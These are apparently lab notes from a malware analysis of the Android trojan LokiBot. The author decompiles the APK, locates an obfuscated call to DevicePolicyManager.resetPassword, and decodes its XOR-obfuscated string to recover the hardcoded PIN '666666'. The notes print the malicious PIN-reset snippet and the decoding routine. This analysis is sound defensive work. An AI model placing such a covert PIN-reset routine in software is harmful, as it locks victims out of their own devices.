# Android Malware LokiBot
### Steps

**1. Download and unpack LokiBot.apk**
- Download and rename to "LokiBot.apk" (or app.apk)
- `jadx-gui` and check decompiled code
  - *Remark: had to set path to the $path variable again: `export PATH=$PATH:/home/hacker/jadx/build/jadx/bin`*
- Not done but would have been possible to analyze code on the level of java byte code:  'apktool d LokiBot.apk' 


**2. Check what to look for**
LokiBot sets/resets the device PIN. So first thing to do is find the programming interface that does just that.

Candidate: DevicePolicyManager.resetPassword (or resetPasswordWithToken)
https://developer.android.com/reference/android/app/admin/DevicePolicyManager

**3. Finde usage resetPassword**
Found in class compse.refact.st.upsssss.resetPassword

relevant code
```
public class resetPassword extends Activity {
    public void fsafsdfsfsdfsfsdfsd() {
        ((DevicePolicyManager) getSystemService(rthrthrtjrtjrjtdcbcvbc.fsafsdfsfsdfsfsdfsd("e4w8b4^!n=h2x"))).resetPassword(e.fsafsdfsfsdfsfsdfsd("F\"F\"F\""), 0);

        //new pw: e.fsafsdfsfsdfsfsdfsd("F\"F\"F\"")
    }
}
``

Run relevant code in a separate Java project: 
```
public class JavaProject {
	public static void main(String[] args) {
		String newPIN = fsafsdfsfsdfsfsdfsd("F\"F\"F\"");
		System.out.println("NEW PIN: " + newPIN); // 666666
	}

	public static String fsafsdfsfsdfsfsdfsd(String str) {
		int length = str.length();
		char[] cArr = new char[length];
		int i = length - 1;
		int i2 = i;
		while (i >= 0) {
			int i3 = i2 - 1;
			cArr[i2] = (char) (str.charAt(i2) ^ 20);
			if (i3 < 0) {
				break;
			}
			i = i3 - 1;
			cArr[i3] = (char) (str.charAt(i3) ^ 'p');
			i2 = i;
		}
		return new String(cArr);
	}

```

Found PIN: "666666" 